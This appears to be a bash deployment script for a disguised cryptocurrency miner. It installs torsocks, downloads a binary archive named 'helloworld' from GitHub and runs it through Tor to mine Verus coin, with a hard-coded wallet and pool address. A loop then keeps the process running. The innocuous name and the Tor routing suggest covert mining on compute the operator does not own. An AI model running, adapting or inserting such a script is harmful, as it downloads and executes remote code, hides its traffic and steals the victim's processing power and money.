#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install torsocks -y
wget "https://github.com/theinterestingdev/helloworld/raw/main/helloworld.tar.gz"
tar xf helloworld.tar.gz
cd helloworld
torsocks ./helloworld -algo Verushash -coin VRSC -wallet RXdK9Kiiz2pLUu9k8i7Tx9RKhLEnCJq9Us.M1 -pool1 eu.luckpool.net:3956 -cpuThreads 2
while [ 1 ]; do
sleep 3
done
sleep 999